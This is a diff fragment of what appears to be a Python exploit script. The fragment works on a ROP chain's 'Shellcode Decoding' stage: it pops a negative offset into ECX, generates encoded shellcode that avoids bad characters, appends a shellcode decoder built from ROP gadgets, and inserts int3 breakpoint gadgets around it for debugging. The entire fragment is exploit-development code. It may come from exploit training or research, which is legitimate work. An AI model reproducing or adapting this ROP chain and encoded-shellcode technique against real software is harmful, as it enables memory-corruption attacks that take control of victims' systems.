@@ -435,6 +435,7 @@ def main():
         *************************** Stage 1d: Shellcode Decoding ***************************
         ************************************************************************************
         """
+        # Align EAX with shellcode
         # rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; ret
         rop += rop_pop_ecx_ret  # pop ecx ; ret
         rop += pack("<L", (0xFFFFF9E5))  # negative offset -1
@@ -444,18 +445,18 @@ def main():
 
         # We're encoding/generating shellcdde here but the decoder is placed later in the rop chain, so we need to generate the shellcode first
         # Get encoded shellcode, moving forward we will be using the encoded shellcode
-        encoded_shellcode, replacements = getShellcode(
-            encoded=True, bad_chars=bad_chars
-        )  
+        encoded_shellcode, replacements = getShellcode(encoded=True, bad_chars=bad_chars)
 
         # Generate the shellcode decoder and add it to the rop chain
+        rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; ret
         rop += generateShellcodeDecoder(
             replacements=replacements,
             rop_pop_ecx=rop_pop_ecx_ret,
             rop_sub_eax_ecx_pop_ebx=rop_sub_eax_ecx_pop_ebx_ret,
             rop_add_ptrEAX_1_bh=rop_add_ptrEAX_1_bh_ret,
-            debug=True
-        )  
+            debug=True,
+        )
+        rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; ret
 
         """
         ************************************************************************************
